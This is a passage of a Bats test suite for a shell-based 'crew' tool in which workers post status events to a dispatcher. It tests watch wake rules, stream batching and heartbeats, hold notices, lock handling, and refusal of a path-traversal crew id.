  run jq -e '.events[0].crew_id == "c1"' <<<"$output"
  [ "$status" -eq 0 ]

  # Without the flag the same call resolves c9 and sees nothing.
  run --separate-stderr run_crew watch --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "watch: --crew leaves the wake set alone — a working status still does not wake it" {
  CREW_ID=c1 run_crew status worker:feat/x working

  run --separate-stderr run_crew watch --crew c1 --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "watch: --crew uses that crew's cursor file and watch lock" {
  cdir="$(crew_dir c1)"
  mkdir -p "$cdir/watch.lock.d"
  printf '%s\n' "$$" >"$cdir/watch.lock.d/pid"

  run --separate-stderr run_crew watch --crew c1 --timeout 1 --interval 1
  [ "$status" -eq 1 ]
  [ "$stderr" = "crew: another watch is already running for this crew (c1)" ]

  rm -rf "$cdir/watch.lock.d"
  CREW_ID=c1 run_crew status worker:feat/x done
  run --separate-stderr run_crew watch --crew c1 --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e --argjson cursor "$(cat "$cdir/cursor")" '.cursor == $cursor' <<<"$output"
  [ "$status" -eq 0 ]
  [ ! -d "$cdir/watch.lock.d" ]
}

# The wake gate for `exited` (#396): a mid-run engine death (its previous state
# was working/blocked) must wake the park, while the ordinary SessionEnd backstop
# posted after the session's own terminal state must stay silent.
@test "watch: a mid-run exited wakes — working then exited" {
  t="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" working "" "" "$t"
  seed_raw "worker:feat/x#s1-1" exited "" "" "$((t + 1000))"

  run --separate-stderr run_crew watch --crew c1 --since "$t" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e '(.events | length) == 1 and .events[0].body.state == "exited"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "watch: an exited after the session's own done does not wake" {
  t="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" working "" "" "$t"
  seed_raw "worker:feat/x#s1-1" done "" "" "$((t + 1000))"
  seed_raw "worker:feat/x#s1-1" exited "" "" "$((t + 2000))"

  # Only the `exited` is newer than the cursor the dispatcher would hold after
  # handling `done` — it must not re-wake for the backstop.
  run --separate-stderr run_crew watch --crew c1 --since "$((t + 1000))" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "watch: a mid-run exited wakes — blocked then exited" {
  t="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" blocked "" "" "$t"
  seed_raw "worker:feat/x#s1-1" exited "" "" "$((t + 1000))"

  run --separate-stderr run_crew watch --crew c1 --since "$t" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e '(.events | length) == 1 and .events[0].body.state == "exited"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "watch: a re-stamped blocked does not wake" {
  t="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 7 of 24)" "" "$t"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 8 of 24)" "" "$((t + 1000))"

  run --separate-stderr run_crew watch --crew c1 --since "$t" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

# #760: workers stamp the measured wait, which drifts by a second or two.
@test "watch: a re-stamp whose measured wait drifted does not wake" {
  t="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 7 of 24)" "" "$t"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 302s, no reply (cycle 8 of 24)" "" "$((t + 1000))"

  run --separate-stderr run_crew watch --crew c1 --since "$t" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "watch: a changed blocked detail wakes" {
  t="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 7 of 24)" "" "$t"
  seed_raw "worker:feat/x#s1-1" blocked "different question (cycle 2 of 24)" "" "$((t + 1000))"

  run --separate-stderr run_crew watch --crew c1 --since "$t" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e '(.events | length) == 1 and .events[0].body.detail == "different question (cycle 2 of 24)"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "watch: a first blocked wakes" {
  t="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 7 of 24)" "" "$t"

  run --separate-stderr run_crew watch --crew c1 --since 0 --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e '(.events | length) == 1 and .events[0].body.state == "blocked"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "watch: a question msg wakes" {
  CREW_ID=c1 run_crew msg "worker:feat/x#s1-1" "dispatcher:c1" '{"q":1}'

  run --separate-stderr run_crew watch --crew c1 --since 0 --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e '(.events | length) == 1 and .events[0].kind == "msg"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "watch: a blocked re-stamp on another session wakes" {
  t="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 7 of 24)" "" "$t"
  seed_raw "worker:feat/x#s2-2" blocked "need a waiver — awaited 300s, no reply (cycle 7 of 24)" "" "$((t + 1000))"

  run --separate-stderr run_crew watch --crew c1 --since "$t" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e '(.events | length) == 1 and .events[0].from == "worker:feat/x#s2-2"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "watch: a blocked after working wakes even with the same detail" {
  t="$(($(date +%s) * 1000))"
  detail="need a waiver — awaited 300s, no reply (cycle 7 of 24)"
  seed_raw "worker:feat/x#s1-1" blocked "$detail" "" "$t"
  seed_raw "worker:feat/x#s1-1" working "$detail" "" "$((t + 1000))"
  seed_raw "worker:feat/x#s1-1" blocked "$detail" "" "$((t + 2000))"

  run --separate-stderr run_crew watch --crew c1 --since "$((t + 1000))" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e --argjson ts "$((t + 2000))" \
    '(.events | length) == 1 and .events[0].body.state == "blocked" and .events[0].ts == $ts' <<<"$output"
  [ "$status" -eq 0 ]
}

# The object row sits at the cursor, so the selected re-stamp is what reads it
# (as prev). An empty re-stamp normalizes equal and stays quiet; the other
# session's done must still arrive. The old predicate aborts in gsub instead.
@test "watch: an object blocked detail does not drop a later done" {
  t="$(($(date +%s) * 1000))"
  logf="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$logf")"
  jq -nc --argjson ts "$t" \
    '{ts:$ts, crew_id:"c1", from:"worker:feat/x#s1-1", to:"dispatcher:c1", kind:"status",
      body:{state:"blocked", detail:{k:true}}}' >>"$logf"
  seed_raw "worker:feat/x#s1-1" blocked "" "" "$((t + 1000))"
  seed_raw "worker:feat/x#s2-2" done "" "" "$((t + 2000))"

  run --separate-stderr run_crew watch --crew c1 --since "$t" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e --argjson ts "$((t + 2000))" \
    '(.events | length) == 1 and .events[0].body.state == "done" and .events[0].from == "worker:feat/x#s2-2" and .events[0].ts == $ts' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "roster: a suppressed re-stamp still refreshes age_s" {
  now_ms="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 7 of 24)" "" "$((now_ms - 30000))"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 8 of 24)" "" "$now_ms"

  CREW_ID=c1 run --separate-stderr run_crew roster c1
  [ "$status" -eq 0 ]
  run jq -e --argjson ts "$now_ms" '.[0].ts == $ts and .[0].age_s < 15' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "watch: a re-stamp stays on the log" {
  t="$(($(date +%s) * 1000))"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 7 of 24)" "" "$t"
  seed_raw "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 8 of 24)" "" "$((t + 1000))"

  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -s -e --arg f "worker:feat/x#s1-1" \
    '[.[] | select(.kind == "status" and .from == $f and .body.state == "blocked")] | length == 2' "$log"
  [ "$status" -eq 0 ]
}

@test "stream: a re-stamped blocked does not wake" {
  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 7 of 24)"
  poll_for 100 at_least_lines 1

  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" blocked "need a waiver — awaited 300s, no reply (cycle 8 of 24)"
  sleep 3
  [ "$(stream_lines)" -eq 1 ]

  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" blocked "different question (cycle 2 of 24)"
  poll_for 100 at_least_lines 2
  [ "$(stream_lines)" -eq 2 ]
  stop_stream
}

@test "watch: a watchdog load: cleared does not wake even if working is in --states" {
  seed_raw "worker:feat/x#s1-1" working "load: cleared" watchdog

  run --separate-stderr run_crew watch --crew c1 --states blocked,working --since 0 --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "watch: a worker working wakes when working is in --states" {
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working

  run --separate-stderr run_crew watch --crew c1 --states blocked,working --since 0 --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e '(.events | length) == 1 and .events[0].body.state == "working"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "status: --restamp records body.restamp on blocked only" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"

  CREW_ID=c1 run --separate-stderr run_crew status "worker:feat/x#s1-1" blocked "q (cycle 1 of 24)" --restamp
  [ "$status" -eq 0 ]
  run jq -s -e \
    '[.[] | select(.body.state == "blocked" and .body.detail == "q (cycle 1 of 24)" and .body.restamp == true)] | length == 1' \
    "$log"
  [ "$status" -eq 0 ]

  before="$(wc -l <"$log")"
  CREW_ID=c1 run --separate-stderr run_crew status "worker:feat/x#s1-1" working --restamp
  [ "$status" -ne 0 ]
  [ "$(wc -l <"$log")" = "$before" ]

  t="$(jq -s -r '[.[] | select(.body.detail == "q (cycle 1 of 24)")][0].ts' "$log")"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" blocked "q (cycle 2 of 24)" --restamp
  run --separate-stderr run_crew watch --crew c1 --since "$t" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  [ -z "$output" ]

  t2="$(jq -s -r '[.[] | select(.body.detail == "q (cycle 2 of 24)")][0].ts' "$log")"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" blocked "other question" --restamp
  run --separate-stderr run_crew watch --crew c1 --since "$t2" --timeout 1 --interval 1
  [ "$status" -eq 0 ]
  run jq -e '(.events | length) == 1 and .events[0].body.detail == "other question"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "status: -- stores a detail that starts with dashes" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"

  CREW_ID=c1 run --separate-stderr run_crew status "worker:feat/x#s1-1" blocked -- '--not-a-flag'
  [ "$status" -eq 0 ]
  run jq -s -e \
    '[.[] | select(.body.state == "blocked" and .body.detail == "--not-a-flag")] | length == 1' \
    "$log"
  [ "$status" -eq 0 ]
}

@test "stream: a batch line passes through verbatim and parses as {cursor, events}" {
  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  CREW_ID=c1 run_crew status worker:feat/x done
  poll_for 100 at_least_lines 1

  line="$(head -n1 "$STREAM_OUT")"
  # Verbatim: the compact single line `watch` printed, not a re-encoding.
  [ "$line" = "$(jq -c . <<<"$line")" ]
  run jq -e '(.events | length) == 1 and .events[0].body.state == "done"
    and .cursor == .events[0].ts' <<<"$line"
  [ "$status" -eq 0 ]
  stop_stream
}

@test "stream: a mid-run exited wakes the lane" {
  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" exited
  poll_for 100 at_least_lines 1

  line="$(head -n1 "$STREAM_OUT")"
  run jq -e '(.events | length) == 1 and .events[0].body.state == "exited"' <<<"$line"
  [ "$status" -eq 0 ]
  stop_stream
}

@test "stream: events posted inside the coalesce window arrive as ONE batch line [F1]" {
  start_stream --crew c1 --park 1 --interval 1 --coalesce 3 --heartbeat 3600 --retry 1
  CREW_ID=c1 run_crew status worker:feat/a done
  poll_for 100 at_least_lines 1
  t0="$(jq -nc 'now*1000|floor')"

  # The stream is now inside its --coalesce sleep.
  CREW_ID=c1 run_crew status worker:feat/b done
  CREW_ID=c1 run_crew status worker:feat/c done
  CREW_ID=c1 run_crew status worker:feat/d done

  poll_for 100 at_least_lines 2
  t1="$(jq -nc 'now*1000|floor')"
  [ "$(stream_lines)" -eq 2 ]
  run jq -e '(.events | length) == 3' <<<"$(tail -n1 "$STREAM_OUT")"
  [ "$status" -eq 0 ]
  # And it is the --coalesce floor that made it one line, not the inner watch's
  # own --interval, which coalesces a burst for free: the second batch cannot
  # arrive before the sleep ends. Half a second of slack for the poll that
  # observed the first line — a lower bound never flakes upward.
  [ "$((t1 - t0))" -ge 2500 ]
  stop_stream
}

@test "stream: a heartbeat appears only after --heartbeat of quiet, not once per park [F6]" {
  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3 --retry 1
  poll_for 200 at_least_lines 1

  # quiet_s, never wall clock: `watch` checks its deadline only after sleeping
  # --interval, so an inner --park 1 costs ~2s and elapsed time diverges from
  # the counter. Three parks' worth of quiet, one line.
  [ "$(stream_lines)" -eq 1 ]
  run jq -e '.stream == "heartbeat" and .crew == "c1" and .quiet_s == 3' <<<"$(head -n1 "$STREAM_OUT")"
  [ "$status" -eq 0 ]
  stop_stream
}

@test "stream: an inner failure does not kill the loop — one line per error key, re-emitted when the key changes [F8]" {
  cdir="$(crew_dir c1)"
  # A live holder of the crew's watch lock: every inner watch exits 1 with the
  # same first stderr line, so the suppression key is stable.
  mkdir -p "$cdir/watch.lock.d"
  printf '%s\n' "$$" >"$cdir/watch.lock.d/pid"
  # Run the stream from a copy, so the fault below can be swapped in without
  # touching the file the rest of the suite runs.
  STREAM_CREW="$BATS_TEST_TMPDIR/crew-copy.sh"
  cp "$CREW" "$STREAM_CREW"

  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  poll_for 200 at_least_lines 1
  run jq -e '.stream == "error" and .rc == 1
    and (.detail | test("another watch is already running"))' <<<"$(head -n1 "$STREAM_OUT")"
  [ "$status" -eq 0 ]

  # Two more iterations of the same failure emit nothing: the tick, rewritten at
  # the top of every iteration, is the evidence the loop is still turning.
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"
  [ "$(stream_lines)" -eq 1 ]

  # A different key IS re-emitted. The replacement must be atomic (write a
  # temp file, then `mv -f` it into place) and scoped to `watch` only: an
  # unlink-then-create leaves a window where $STREAM_CREW is briefly absent,
  # which a fork landing there turns into a THIRD, unrelated error key
  # (rc=127, "No such file or directory"); and faulting every subcommand
  # (not just `watch`) makes the loop's own `hold due` pre-check fail too,
  # under an independent suppression key, so its "hold due: ..." line can
  # race ahead of the "crew: fault injected" line this test asserts on. Not
  # by making the inner `mkdir -p "$cdir"` fail: the stream's own tick write
  # and its $outf redirect are in that same directory, so a file there kills
  # the loop under `set -e` instead of failing one iteration of it — and the
  # assertion below would then hold vacuously.
  rm -rf "$cdir/watch.lock.d"
  tmp=$(mktemp "$BATS_TEST_TMPDIR/crew-copy.XXXXXX")
  printf '%s\n' '#!/usr/bin/env bash' \
    'case "${1:-}" in' \
    '  watch) echo "crew: fault injected" >&2; exit 3 ;;' \
    '  *) exit 0 ;;' \
    'esac' >"$tmp"
  mv -f "$tmp" "$STREAM_CREW"

  poll_for 200 at_least_lines 2
  [ "$(stream_lines)" -eq 2 ]
  run jq -e '.stream == "error" and .rc == 3 and .detail == "crew: fault injected"' <<<"$(tail -n1 "$STREAM_OUT")"
  [ "$status" -eq 0 ]
  stop_stream
}

@test "stream: a matured hold produces exactly one hold_due line, not one per park" {
  # Seeded already-matured rather than added a second in the future: `hold add`
  # refuses a past --resets-at, so a near-future add races its own fork+jq cost
  # against the deadline it just set, and loses under --jobs 16.
  id=h1
  seed_hold c1 "$id" "$(($(date +%s) - 5))"

  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  poll_for 200 at_least_hold_due_lines 1

  # Two more iterations of the same matured hold emit nothing further — the
  # tick, rewritten at the top of every iteration, is the evidence the loop
  # is still turning (same idiom as the error-suppression test above).
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"
  [ "$(hold_due_lines)" -eq 1 ]

  run jq -e --arg id "$id" \
    '.stream == "hold_due" and .crew == "c1" and (.holds | map(.id) == [$id])' \
    <<<"$(head -n1 "$STREAM_OUT")"
  [ "$status" -eq 0 ]
  stop_stream
}

@test "stream: an unmatured hold produces no hold_due line" {
  now=$(date +%s)
  add_hold "$((now + 3600))" future

  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  poll_for 100 lock_pid_is "$STREAM_PID"
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"

  [ "$(hold_due_lines)" -eq 0 ]
  [ "$(stream_lines)" -eq 0 ]
  stop_stream
}

@test "stream: releasing one of two matured holds re-announces the other on the next iteration, no restart" {
  # Both seeded to the same past instant, so they mature together by
  # construction — two near-future adds cannot be made simultaneous.
  id1=h1
  id2=h2
  matured_at=$(($(date +%s) - 5))
  seed_hold c1 "$id1" "$matured_at"
  seed_hold c1 "$id2" "$matured_at"
  expected=$(jq -nr --arg a "$id1" --arg b "$id2" '[$a, $b] | sort | join(",")')

  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  poll_for 200 at_least_hold_due_lines 1

  ids1=$(jq -r '.holds | map(.id) | sort | join(",")' <<<"$(head -n1 "$STREAM_OUT")")
  [ "$ids1" = "$expected" ]

  run_crew hold release "$id1" --crew c1
  poll_for 200 at_least_hold_due_lines 2

  # The re-announcement is keyed on the matured id SET changing, not on a
  # count — assert the surviving id, not just that a second line arrived.
  line2=$(grep '"stream":"hold_due"' "$STREAM_OUT" | sed -n '2p')
  ids2=$(jq -r '.holds | map(.id) | sort | join(",")' <<<"$line2")
  [ "$ids2" = "$id2" ]

  # No further re-announcement while the set stays put and --heartbeat has
  # not elapsed.
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"
  [ "$(hold_due_lines)" -eq 2 ]
  stop_stream
}

@test "stream: hold_due does not reset quiet — the heartbeat still fires on schedule" {
  seed_hold c1 h1 "$(($(date +%s) - 5))"

  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3 --retry 1
  poll_for 200 at_least_hold_due_lines 1
  poll_for 300 heartbeat_seen

  # quiet_s == 3, the same value the plain heartbeat test (--heartbeat 3,
  # --park 1) asserts: three parks' worth of quiet, undisturbed by hold_due
  # firing on the same iterations.
  run jq -e '.stream == "heartbeat" and .quiet_s == 3' <<<"$(heartbeat_line)"
  [ "$status" -eq 0 ]
  stop_stream
}

@test "stream: a failing hold due is announced as an error, not swallowed as no-holds" {
  # `hold due` exits 1 by design when nothing is matured, so the loop cannot
  # treat every nonzero rc as silence — a real failure there is the one branch
  # nothing else watches. Fault only `hold due`: the stream re-execs the same
  # $0 for `watch` too, and failing both would leave the inner-watch error
  # line indistinguishable from this one.
  STREAM_CREW="$BATS_TEST_TMPDIR/crew-holdfault.sh"
  {
    head -n1 "$CREW"
    printf '%s\n' 'if [ "${1:-}" = hold ] && [ "${2:-}" = due ]; then echo "crew: hold fault injected" >&2; exit 3; fi'
    tail -n +2 "$CREW"
  } >"$STREAM_CREW"
  chmod +x "$STREAM_CREW"

  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  poll_for 200 at_least_lines 1

  run jq -e '.stream == "error" and .rc == 3
    and .detail == "hold due: crew: hold fault injected"' <<<"$(head -n1 "$STREAM_OUT")"
  [ "$status" -eq 0 ]

  # Suppressed like the inner-watch error path: the same failure on later
  # iterations adds no line, and the tick proves the loop is still turning.
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"
  t="$(tick_ts)"
  poll_for 100 tick_after "$t"
  [ "$(stream_lines)" -eq 1 ]
  stop_stream
}

@test "stream: a crew with no holds streams batches and heartbeats unchanged" {
  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3 --retry 1
  CREW_ID=c1 run_crew status worker:feat/x done
  poll_for 100 at_least_lines 1
  run jq -e '(.events | length) == 1 and .events[0].body.state == "done"' \
    <<<"$(head -n1 "$STREAM_OUT")"
  [ "$status" -eq 0 ]

  poll_for 200 at_least_lines 2
  run jq -e '.stream == "heartbeat" and .quiet_s == 3' <<<"$(tail -n1 "$STREAM_OUT")"
  [ "$status" -eq 0 ]
  [ "$(stream_lines)" -eq 2 ]
  [ "$(hold_due_lines)" -eq 0 ]
  stop_stream
}

@test "stream --status: no lock is dead, exit 2" {
  run --separate-stderr run_crew stream --status --crew c1
  [ "$status" -eq 2 ]
  run jq -e '.stream == "status" and .state == "dead" and .crew == "c1"
    and .pid == null and .age_s == null' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "stream --status: a live stream is alive, exit 0" {
  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  poll_for 100 lock_pid_is "$STREAM_PID"

  run --separate-stderr run_crew stream --status --crew c1
  [ "$status" -eq 0 ]
  run jq -e --argjson pid "$STREAM_PID" '.state == "alive" and .pid == $pid and .age_s >= 0' <<<"$output"
  [ "$status" -eq 0 ]
  stop_stream
}

@test "stream --status: a live pid whose tick stopped moving is stale, exit 1 [F4]" {
  cdir="$(crew_dir c1)"
  mkdir -p "$cdir/stream.lock.d"
  printf '%s\n' "$$" >"$cdir/stream.lock.d/pid"

  # A live lock with no tick yet counts as stale — the safe direction.
  run --separate-stderr run_crew stream --status --crew c1
  [ "$status" -eq 1 ]
  run jq -e '.state == "stale" and .age_s == null' <<<"$output"
  [ "$status" -eq 0 ]

  # …and so does one aged past 2 × the park the tick itself recorded, + 60.
  now="$(jq -nc 'now*1000|floor')"
  jq -nc --argjson pid "$$" --argjson ts "$((now - 121000))" '{pid:$pid, ts:$ts, park:1}' >"$cdir/stream.tick"
  run --separate-stderr run_crew stream --status --crew c1
  [ "$status" -eq 1 ]
  run jq -e '.state == "stale" and .age_s >= 121' <<<"$output"
  [ "$status" -eq 0 ]

  # Same live pid, fresh tick: alive. So it is the tick that decides.
  jq -nc --argjson pid "$$" --argjson ts "$now" '{pid:$pid, ts:$ts, park:1}' >"$cdir/stream.tick"
  run --separate-stderr run_crew stream --status --crew c1
  [ "$status" -eq 0 ]
  run jq -e '.state == "alive"' <<<"$output"
  [ "$status" -eq 0 ]
}

@test "stream: crew-resolution and usage failures exit 64, not 1 [C2]" {
  run --separate-stderr run_crew stream --status
  [ "$status" -eq 64 ]
  [ "$stderr" = "crew: CREW_ID unset and no WORKER_TASK.md crew_id" ]

  run --separate-stderr run_crew stream --crew c1 --bogus
  [ "$status" -eq 64 ]
  [ "$stderr" = "crew: stream: unknown arg '--bogus'" ]

  run --separate-stderr run_crew stream --crew c1 --park 0
  [ "$status" -eq 64 ]
}

@test "stream: a second stream for one crew is refused" {
  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  poll_for 100 lock_pid_is "$STREAM_PID"

  run --separate-stderr run_crew stream --crew c1 --park 1 --interval 1
  [ "$status" -eq 1 ]
  [[ "$stderr" == *"another stream is already running for this crew (c1)"* ]]
  [[ "$stderr" == *"pid $STREAM_PID"* ]]

  # The refusal must leave the incumbent's lock alone.
  lock_pid_is "$STREAM_PID"
  stop_stream
}

@test "stream: --force reclaims a lock held by a live pid [B3]" {
  cdir="$(crew_dir c1)"
  mkdir -p "$cdir/stream.lock.d"
  spawn_holder
  # A dead holder would be reclaimed by _lock_acquire itself and --force would
  # never be exercised, so the liveness is an assertion, not an assumption.
  kill -0 "$HOLDER_PID"
  printf '%s\n' "$HOLDER_PID" >"$cdir/stream.lock.d/pid"

  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1 --force
  poll_for 100 lock_pid_is "$STREAM_PID"
  proc_gone "$HOLDER_PID"
  stop_stream
}

@test "stream: --force refuses to signal a lock pid file containing 0" {
  cdir="$(crew_dir c1)"
  mkdir -p "$cdir/stream.lock.d"
  printf '%s\n' 0 >"$cdir/stream.lock.d/pid"

  # 0 as a signal target hits our whole process group, and `_lock_acquire`'s
  # own `kill -0` reads it as live — so --force must refuse before it ever
  # calls `kill -TERM` on it.
  run --separate-stderr run_crew stream --crew c1 --force --park 1 --interval 1
  [ "$status" -eq 1 ]
  [ "$stderr" = "crew: --force found no valid holder pid for crew (c1) stream lock (got '0') — refusing to signal" ]

  # The lock is untouched — refused, not reclaimed.
  [ -d "$cdir/stream.lock.d" ]
  [ "$(cat "$cdir/stream.lock.d/pid")" = 0 ]
}

@test "watch and stream: a traversal-shaped --crew is refused, writing nothing outside the bus dir" {
  common="$(git rev-parse --path-format=absolute --git-common-dir)"

  run --separate-stderr run_crew watch --crew '../../escaped' --timeout 1 --interval 1
  [ "$status" -eq 1 ]
  [[ "$stderr" == *"invalid crew id"* ]]
  [ ! -e "$common/escaped" ]
  [ ! -e "$common/crew/escaped" ]

  run --separate-stderr run_crew stream --crew '../../escaped' --park 1 --interval 1
  [ "$status" -eq 64 ]
  [[ "$stderr" == *"invalid crew id"* ]]
  [ ! -e "$common/escaped" ]
  [ ! -e "$common/crew/escaped" ]
}

@test "stream: a TERM mid-park leaves no live watch, a released lock and an unadvanced cursor [F2]" {
  cdir="$(crew_dir c1)"
  # --park well past the assertions below, so an orphan that outlives the
  # stream is still alive to be caught: a park short enough to expire during
  # the test would release the lock and stop advancing the cursor on its own,
  # and every assertion here would pass with no child kill at all.
  start_stream --crew c1 --park 10 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  poll_for 100 test -f "$cdir/watch.lock.d/pid"
  wpid="$(cat "$cdir/watch.lock.d/pid")"

  kill -TERM "$STREAM_PID"
  wait "$STREAM_PID" 2>/dev/null || true
  STREAM_PIDS=""
  STREAM_PID=""

  # Bounded by one --interval: the inner watch runs its EXIT trap only once its
  # sleep returns, so an immediate check would pass on a watch still alive.
  poll_for 20 proc_gone "$wpid"
  [ ! -d "$cdir/watch.lock.d" ]
  [ ! -e "$cdir/cursor" ]

  # The assertion that matters: an orphan would print a batch to a stdout
  # nobody reads and still mv its cursor into place, which a lock check cannot
  # see — a watch can advance the cursor and release the lock on the same exit.
  CREW_ID=c1 run_crew status worker:feat/x done
  sleep 2
  [ ! -e "$cdir/cursor" ]
}

@test "stream: a TERM with an undrained stream.out still emits that batch [B1]" {
  cdir="$(crew_dir c1)"
  # No qualifying event, so the inner watch is parked in its sleep with nothing
  # written — the natural window is microseconds wide, so the test plants the
  # undrained batch itself.
  start_stream --crew c1 --park 5 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  poll_for 100 test -f "$cdir/watch.lock.d/pid"

  batch='{"cursor":1,"events":[{"ts":1,"crew_id":"c1","from":"worker:feat/x","to":"dispatcher:c1","kind":"status","body":{"state":"done"}}]}'
  printf '%s\n' "$batch" >"$cdir/stream.out"

  kill -TERM "$STREAM_PID"
  wait "$STREAM_PID" 2>/dev/null || true
  STREAM_PIDS=""
  STREAM_PID=""

  # Sound only because the cleanup kills AND reaps the child before draining:
  # an unreaped child could overwrite the file from its offset-0 fd mid-drain.
  [ "$(cat "$STREAM_OUT")" = "$batch" ]
  [ ! -e "$cdir/stream.out" ]
}

@test "stream: writes nothing to its own stderr in normal operation [F8]" {
  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 2 --retry 1
  CREW_ID=c1 run_crew status worker:feat/x done

  # Both printing paths, and the park-expiry line `watch` writes to ITS stderr
  # on every iteration.
  poll_for 200 at_least_lines 2
  run jq -e -s '.[0].cursor != null and .[1].stream == "heartbeat"' "$STREAM_OUT"
  [ "$status" -eq 0 ]
  stop_stream
  [ ! -s "$STREAM_ERR" ]
}

@test "stream: a pre-seeded cursor is honoured, so --since is never passed" {
  cdir="$(crew_dir c1)"
  CREW_ID=c1 run_crew status worker:feat/old done
  mkdir -p "$cdir"
  bus | jq -r '.ts' | tail -n1 >"$cdir/cursor"

  start_stream --crew c1 --park 1 --interval 1 --coalesce 1 --heartbeat 3600 --retry 1
  CREW_ID=c1 run_crew status worker:feat/new done
  poll_for 100 at_least_lines 1

  [ "$(stream_lines)" -eq 1 ]
  run jq -e '(.events | length) == 1 and .events[0].from == "worker:feat/new"' <<<"$(head -n1 "$STREAM_OUT")"
  [ "$status" -eq 0 ]
  run jq -e --argjson cursor "$(cat "$cdir/cursor")" '.cursor == $cursor' <<<"$(head -n1 "$STREAM_OUT")"
